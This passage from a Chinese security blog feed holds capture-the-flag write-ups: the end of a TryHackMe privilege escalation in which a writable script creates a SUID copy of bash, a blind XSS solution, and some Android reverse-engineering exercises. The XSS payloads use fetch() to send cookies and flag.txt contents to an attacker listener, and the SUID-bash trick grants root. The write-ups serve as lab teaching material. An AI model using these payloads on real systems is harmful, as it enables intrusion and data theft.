class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">think@publisher:/<span class="hljs-title">var</span>/<span class="hljs-title">tmp</span>$ <span class="hljs-title">ls</span> -<span class="hljs-title">al</span> /<span class="hljs-title">opt</span></span><br><span class="hljs-function"><span class="hljs-title">total</span> 20</span><br><span class="hljs-function"><span class="hljs-title">drwxr</span>-<span class="hljs-title">xr</span>-<span class="hljs-title">x</span>  3 <span class="hljs-title">root</span> <span class="hljs-title">root</span> 4096 <span class="hljs-title">Jan</span> 10  2024 .</span><br><span class="hljs-function"><span class="hljs-title">drwxr</span>-<span class="hljs-title">xr</span>-<span class="hljs-title">x</span> 18 <span class="hljs-title">root</span> <span class="hljs-title">root</span> 4096 <span class="hljs-title">Nov</span> 14  2023 ..</span><br><span class="hljs-function"><span class="hljs-title">drwx</span>--<span class="hljs-title">x</span>--<span class="hljs-title">x</span>  4 <span class="hljs-title">root</span> <span class="hljs-title">root</span> 4096 <span class="hljs-title">Nov</span> 14  2023 <span class="hljs-title">containerd</span></span><br><span class="hljs-function">-<span class="hljs-title">rw</span>-<span class="hljs-title">r</span>--<span class="hljs-title">r</span>--  1 <span class="hljs-title">root</span> <span class="hljs-title">root</span>  861 <span class="hljs-title">Dec</span>  7  2023 <span class="hljs-title">dockerfile</span></span><br><span class="hljs-function">-<span class="hljs-title">rwxrwxrwx</span>  1 <span class="hljs-title">root</span> <span class="hljs-title">root</span> 1715 <span class="hljs-title">Jan</span> 10  2024 <span class="hljs-title">run_container.sh</span></span><br></code></pre></td></tr></table></figure><p>重写 <code>run_container.sh</code> </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">#!/bin/bash<br>cp /bin/bash /var/tmp/Bash<br>chmod +s /var/tmp/Bash<br></code></pre></td></tr></table></figure><p>运行 </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">/usr/sbin/run_container<br></code></pre></td></tr></table></figure><p>现在就已经是 root 了</p><p><img src="https://img.dkdun.cn/v1/2025/12/5164206df1860b5c.png"></p><p>运行 Bash</p><p><img src="https://img.dkdun.cn/v1/2025/12/9ebbe8d57c10a4ae.png"></p><p>得到 root flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">3</span>a<span class="hljs-number">4225</span><span class="hljs-keyword">cc</span><span class="hljs-number">9e85709</span>adda<span class="hljs-number">6</span>ef<span class="hljs-number">55</span>d<span class="hljs-number">6</span>a<span class="hljs-number">4</span>f<span class="hljs-number">2</span>ca<br></code></pre></td></tr></table></figure><p>其实还有一个方法  <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor?ref=benheater.com#apparmor-shebang-bypass">AppArmor Shebang Bypass</a> 可以绕过 AppArmor</p><p>：）</p><h1 id="The-Sticker-Shop"><a href="#The-Sticker-Shop" class="headerlink" title="The Sticker Shop"></a>The Sticker Shop</h1><h2 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h2><p>Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!</p><p>Can you read the flag at <code>http://10.10.110.119:8080/flag.txt</code>?</p><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="nmap-1"><a href="#nmap-1" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">nmap -sS -sV -Pn <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">110</span>.<span class="hljs-number">119</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5f3d31dcd6452d34.png" alt="img"></p><p>开放了 8080 和 22 端口</p><h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>老样子，访问 8080 端口，一个商店网站</p><p><img src="https://img.dkdun.cn/v1/2025/12/9cad434d786ac45b.png" alt="img"></p><p>直接访问 <code>flag.txt</code> 会返回 401</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">401 Unauthorized<br></code></pre></td></tr></table></figure><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p><img src="https://img.dkdun.cn/v1/2025/12/73127521326842fb.png" alt="img"></p><p>我们能看到有一个 <code>Feedback</code>页面，像 XSS，但是输入 payload 后没回显</p><p>尝试直接弹 cookie</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://10.14.96.245:1234/&quot;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>nc 监听</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">Ncat: <span class="hljs-title">Version</span> 7.95 ( <span class="hljs-title">https</span>://<span class="hljs-title">nmap.org</span>/<span class="hljs-title">ncat</span> )</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Listening</span> <span class="hljs-title">on</span> [::]:1234</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Listening</span> <span class="hljs-title">on</span> 0.0.0.0:1234</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Connection</span> <span class="hljs-title">from</span> 10.10.110.119:35480.</span><br><span class="hljs-function"><span class="hljs-title">GET</span> / <span class="hljs-title">HTTP</span>/1.1</span><br><span class="hljs-function"><span class="hljs-title">Host</span>: 10.14.96.245:1234</span><br><span class="hljs-function"><span class="hljs-title">Connection</span>: <span class="hljs-title">keep</span>-<span class="hljs-title">alive</span></span><br><span class="hljs-function"><span class="hljs-title">User</span>-<span class="hljs-title">Agent</span>: <span class="hljs-title">Mozilla</span>/5.0 (<span class="hljs-title">X11</span>; <span class="hljs-title">Linux</span> <span class="hljs-title">x86_64</span>) <span class="hljs-title">AppleWebKit</span>/537.36 (<span class="hljs-title">KHTML</span>, <span class="hljs-title">like</span> <span class="hljs-title">Gecko</span>) <span class="hljs-title">HeadlessChrome</span>/119.0.6045.105 <span class="hljs-title">Safari</span>/537.36</span><br><span class="hljs-function"><span class="hljs-title">Accept</span>: */*</span><br><span class="hljs-function"><span class="hljs-title">Origin</span>: <span class="hljs-title">http</span>://127.0.0.1:8080</span><br><span class="hljs-function"><span class="hljs-title">Referer</span>: <span class="hljs-title">http</span>://127.0.0.1:8080/</span><br><span class="hljs-function"><span class="hljs-title">Accept</span>-<span class="hljs-title">Encoding</span>: <span class="hljs-title">gzip</span>, <span class="hljs-title">deflate</span></span><br></code></pre></td></tr></table></figure><p>并没有什么有用的信息</p><p>直接向服务器读取信息反弹到本机上，payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://10.10.110.119:8080/flag.txt&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<span class="hljs-keyword">return</span> response.<span class="hljs-title function_">text</span>();&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://10.14.96.245:1234/&quot;</span>+data);&#125;)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>返回信息</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">Ncat: <span class="hljs-title">Version</span> 7.95 ( <span class="hljs-title">https</span>://<span class="hljs-title">nmap.org</span>/<span class="hljs-title">ncat</span> )</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Listening</span> <span class="hljs-title">on</span> [::]:1234</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Listening</span> <span class="hljs-title">on</span> 0.0.0.0:1234</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Connection</span> <span class="hljs-title">from</span> 10.10.110.119:43650.</span><br><span class="hljs-function"><span class="hljs-title">GET</span> /<span class="hljs-title">THM</span>%7<span class="hljs-title">B83789a69074f636f64a38879cfcabe8b62305ee6</span>%7<span class="hljs-title">D</span> <span class="hljs-title">HTTP</span>/1.1</span><br><span class="hljs-function"><span class="hljs-title">Host</span>: 10.14.96.245:1234</span><br><span class="hljs-function"><span class="hljs-title">Connection</span>: <span class="hljs-title">keep</span>-<span class="hljs-title">alive</span></span><br><span class="hljs-function"><span class="hljs-title">User</span>-<span class="hljs-title">Agent</span>: <span class="hljs-title">Mozilla</span>/5.0 (<span class="hljs-title">X11</span>; <span class="hljs-title">Linux</span> <span class="hljs-title">x86_64</span>) <span class="hljs-title">AppleWebKit</span>/537.36 (<span class="hljs-title">KHTML</span>, <span class="hljs-title">like</span> <span class="hljs-title">Gecko</span>) <span class="hljs-title">HeadlessChrome</span>/119.0.6045.105 <span class="hljs-title">Safari</span>/537.36</span><br><span class="hljs-function"><span class="hljs-title">Accept</span>: */*</span><br><span class="hljs-function"><span class="hljs-title">Origin</span>: <span class="hljs-title">http</span>://127.0.0.1:8080</span><br><span class="hljs-function"><span class="hljs-title">Referer</span>: <span class="hljs-title">http</span>://127.0.0.1:8080/</span><br><span class="hljs-function"><span class="hljs-title">Accept</span>-<span class="hljs-title">Encoding</span>: <span class="hljs-title">gzip</span>, <span class="hljs-title">deflate</span></span><br></code></pre></td></tr></table></figure><p>URLdecode 一下</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">THM&#123;<span class="hljs-number">83789</span>a69074f636f64a38879cfcabe8b62305ee6&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AppArmor</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android小记</title>
    <link href="/2025/02/11/Android%E5%B0%8F%E8%AE%B0/"/>
    <url>/2025/02/11/Android%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>最近 SWDD 师傅（Android 神!）给了几道简单的 Android 题目，我拿来做了做，感觉 Android 真有意思吧hhhhhh可惜我不会呜呜呜。做题期间在 ida 的深色和浅色模式下反复横跳，最终选择了深色（果然一开始干正事什么都变得有趣了起来）</p><span id="more"></span><h1 id="APK-反编译-level1"><a href="#APK-反编译-level1" class="headerlink" title="APK 反编译-level1"></a>APK 反编译-level1</h1><p>jeb 反编译</p><p><img src="https://img.dkdun.cn/v1/2025/12/e4fbcd1524596e6e.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;Your_are_go0d_at_Uncompile_Android!&#125;<br></code></pre></td></tr></table></figure><h1 id="Native-层反编译-level2"><a href="#Native-层反编译-level2" class="headerlink" title="Native 层反编译-level2"></a><strong>Native 层反编译</strong>-level2</h1><p><code>Native</code>层反编译，那么我们得去把 <code>so</code> 层提取出来，用 apktool</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">apktool</span> d apk名 -o <span class="hljs-string">&quot;需要生成的文件夹&quot;</span><br></code></pre></td></tr></table></figure><p>找到 <code>\lib\x86_64\libsummertrain.so</code> 文件丢入 ida 就出来</p><p><img src="https://img.dkdun.cn/v1/2025/12/fb79af6175c32845.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;Now_You_Know_Native_uncompile&#125;</span><br></code></pre></td></tr></table></figure><h1 id="静态注册-level3"><a href="#静态注册-level3" class="headerlink" title="静态注册-level3"></a><strong>静态注册</strong>-level3</h1><p>提取 <code>.so</code> 文件丢入 ida，找到 <code>Java_com_swdd_summertrain_MainActivity_Check</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">Java_com_swdd_summertrain_MainActivity_Check</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span><br>&#123;<br>   ...<br>  v27 = v3;<br>  v5 = <span class="hljs-number">0LL</span>;<br>  v6 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + <span class="hljs-number">1352LL</span>))(a1, a3, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">if</span> ( v6 )<br>  &#123;<br>    v7 = v6;<br>    v8 = <span class="hljs-built_in">strlen</span>(v6);<br>    v9 = (<span class="hljs-type">char</span> *)operator new[](v8 + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> ( !v8 )<br>      <span class="hljs-keyword">goto</span> LABEL_11;<br>    <span class="hljs-keyword">if</span> ( v8 &lt; <span class="hljs-number">8</span> || v9 &lt; &amp;v7[v8] &amp;&amp; v7 &lt; &amp;v9[v8] )<br>    &#123;<br>      v10 = <span class="hljs-number">0LL</span>;<br>LABEL_7:<br>      v11 = v8 + ~v10;<br>      v12 = v8 &amp; <span class="hljs-number">3</span>;<br>      <span class="hljs-keyword">if</span> ( (v8 &amp; <span class="hljs-number">3</span>) != <span class="hljs-number">0</span> )<br>      &#123;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>          v9[v10] = v7[v10] ^ <span class="hljs-number">0x33</span>;<br>          ++v10;<br>          --v12;<br>        &#125;<br>        <span class="hljs-keyword">while</span> ( v12 );<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v11 &gt;= <span class="hljs-number">3</span> )<br>      &#123;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>          v9[v10] = v7[v10] ^ <span class="hljs-number">0x33</span>;<br>          v9[v10 + <span class="hljs-number">1</span>] = v7[v10 + <span class="hljs-number">1</span>] ^ <span class="hljs-number">0x33</span>;<br>          v9[v10 + <span class="hljs-number">2</span>] = v7[v10 + <span class="hljs-number">2</span>] ^ <span class="hljs-number">0x33</span>;<br>          v9[v10 + <span class="hljs-number">3</span>] = v7[v10 + <span class="hljs-number">3</span>] ^ <span class="hljs-number">0x33</span>;<br>          v10 += <span class="hljs-number">4LL</span>;<br>        &#125;<br>        <span class="hljs-keyword">while</span> ( v8 != v10 );<br>      &#125;<br>      <span class="hljs-keyword">goto</span> LABEL_11;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v8 &lt; <span class="hljs-number">0x20</span> )<br>    &#123;<br>      v10 = <span class="hljs-number">0LL</span>;<br>LABEL_22:<br>      v26 = v10;<br>      v10 = v8 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF8</span>LL;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        *(_QWORD *)&amp;v9[v26] = *(_QWORD *)&amp;v7[v26] ^ <span class="hljs-number">0x3333333333333333</span>LL;<br>        v26 += <span class="hljs-number">8LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v10 != v26 );<br>      <span class="hljs-keyword">if</span> ( v8 != v10 )<br>        <span class="hljs-keyword">goto</span> LABEL_7;<br>LABEL_11:<br>      v9[v8] = <span class="hljs-number">0</span>;<br>      v13 = <span class="hljs-built_in">memcmp</span>(v9, <span class="hljs-string">&quot;U_RTH&#125;\\Dlj\\Flx]\\Dl&#125;RGZEVlWJ]R^ZPlAVTZ@GARGZ\\]Ncovariant return thunk to &quot;</span>, v8) == <span class="hljs-number">0</span>;<br>      v14 = (*(__int64 (__fastcall **)(__int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">48LL</span>))(a1, <span class="hljs-string">&quot;java/lang/Boolean&quot;</span>);<br>      v15 = v14;<br>      v16 = (*(__int64 (__fastcall **)(__int64, __int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">264LL</span>))(<br>              a1,<br>              v14,<br>              <span class="hljs-string">&quot;&lt;init&gt;&quot;</span>,<br>              <span class="hljs-string">&quot;(Z)V&quot;</span>);<br>      v5 = _JNIEnv::NewObject(a1, v15, v16, v13, v17, v18, v27);<br>      (*(<span class="hljs-type">void</span> (__fastcall **)(__int64, __int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">1360LL</span>))(a1, a3, v7);<br>      operator delete[](v9);<br>      <span class="hljs-keyword">return</span> v5;<br>    &#125;<br>    v10 = v8 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0</span>LL;<br>    v20 = (((v8 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0</span>LL) - <span class="hljs-number">32</span>) &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( (v8 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0</span>LL) == <span class="hljs-number">32</span> )<br>    &#123;<br>      v22 = <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">if</span> ( (v20 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_20;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v21 = v20 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFE</span>LL;<br>      v22 = <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v23 = _mm_xor_ps(*(__m128 *)&amp;v7[v22 + <span class="hljs-number">16</span>], (__m128)xmmword_CA80);<br>        *(__m128 *)&amp;v9[v22] = _mm_xor_ps(*(__m128 *)&amp;v7[v22], (__m128)xmmword_CA80);<br>        *(__m128 *)&amp;v9[v22 + <span class="hljs-number">16</span>] = v23;<br>        v24 = _mm_xor_ps(*(__m128 *)&amp;v7[v22 + <span class="hljs-number">48</span>], (__m128)xmmword_CA80);<br>        *(__m128 *)&amp;v9[v22 + <span class="hljs-number">32</span>] = _mm_xor_ps(*(__m128 *)&amp;v7[v22 + <span class="hljs-number">32</span>], (__m128)xmmword_CA80);<br>        *(__m128 *)&amp;v9[v22 + <span class="hljs-number">48</span>] = v24;<br>        v22 += <span class="hljs-number">64LL</span>;<br>        v21 -= <span class="hljs-number">2LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v21 );<br>      <span class="hljs-keyword">if</span> ( (v20 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_20;<br>    &#125;<br>    v25 = _mm_xor_ps(*(__m128 *)&amp;v7[v22 + <span class="hljs-number">16</span>], (__m128)xmmword_CA80);<br>    *(__m128 *)&amp;v9[v22] = _mm_xor_ps(*(__m128 *)&amp;v7[v22], (__m128)xmmword_CA80);<br>    *(__m128 *)&amp;v9[v22 + <span class="hljs-number">16</span>] = v25;<br>LABEL_20:<br>    <span class="hljs-keyword">if</span> ( v8 == v10 )<br>      <span class="hljs-keyword">goto</span> LABEL_11;<br>    <span class="hljs-keyword">if</span> ( (v8 &amp; <span class="hljs-number">0x18</span>) == <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">goto</span> LABEL_7;<br>    <span class="hljs-keyword">goto</span> LABEL_22;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v5;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码主要流程为：对字符串 <code>v6</code> 进行异或，分为几种情况：</p><ul><li>如果字符串长度小于 8，逐字节进行异或，每个字符都与 <code>0x33</code> 异或</li><li>如果长度在 8 ~ 32 之间，按 8 字节为一组进行异或，异或值是 <code>0x3333333333333333LL</code></li><li>如果长度超过 32 字节，使用 <strong>SSE 指令</strong>（<code>_mm_xor_ps</code>），每次处理 16 字节，用一个全局常量 <code>xmmword_CA80</code> 进行异或</li></ul><p>解码后的字符串会与一个固定字符串 <code>U_RTH&#125;\\Dlj\\Flx]\\Dl&#125;RGZEVlWJ]R^ZPlAVTZ@GARGZ\\]Ncovariant return thunk to</code> 进行比较，相等则正确，exp 如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;immintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdint&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decode</span><span class="hljs-params">(<span class="hljs-type">char</span>* encoded, <span class="hljs-type">size_t</span> length)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (length &lt; <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            encoded[i] ^= <span class="hljs-number">0x33</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (length &lt; <span class="hljs-number">32</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; length; i += <span class="hljs-number">8</span>) &#123;<br>            <span class="hljs-type">uint64_t</span>* block = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">uint64_t</span>*&gt;(encoded + i);<br>            *block ^= <span class="hljs-number">0x3333333333333333LL</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            encoded[i] ^= <span class="hljs-number">0x33</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* originalEncodedString = <span class="hljs-string">&quot;U_RTH&#125;\\Dlj\\Flx]\\Dl&#125;RGZEVlWJ]R^ZPlAVTZ@GARGZ\\]Ncovariant return thunk to&quot;</span>;<br>    <span class="hljs-type">size_t</span> length = <span class="hljs-built_in">strlen</span>(originalEncodedString);<br><br>    <span class="hljs-comment">// 动态分配内存，防止栈溢出</span><br>    <span class="hljs-type">char</span>* encodedString = <span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[length + <span class="hljs-number">1</span>];<br>    <span class="hljs-built_in">strcpy</span>(encodedString, originalEncodedString);<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;加密字符串: &quot;</span> &lt;&lt; encodedString &lt;&lt; std::endl;<br><br>    <span class="hljs-built_in">decode</span>(encodedString, length);<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;解密后的字符串: &quot;</span> &lt;&lt; encodedString &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// 释放动态分配的内存</span><br>    <span class="hljs-keyword">delete</span>[] encodedString;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/e02ce8479e10fbfa.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;Now_You_Know_Native_dynamic_registration&#125;<br></code></pre></td></tr></table></figure><h1 id="动态注册-level4"><a href="#动态注册-level4" class="headerlink" title="动态注册-level4"></a><strong>动态注册</strong>-level4</h1><p>动态注册的方法一般来说需要分析 <code>JNI_OnLoad</code> 函数，把 <code>libsummertrain.so</code> 丢进 ida分析</p><p><img src="https://img.dkdun.cn/v1/2025/12/5c77e2e9e0f3031a.png"></p><p>emmmmm，这里我似乎没分析出什么来，然后看了眼其他函数，发现了 <code>sub_172E0</code> 函数有东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 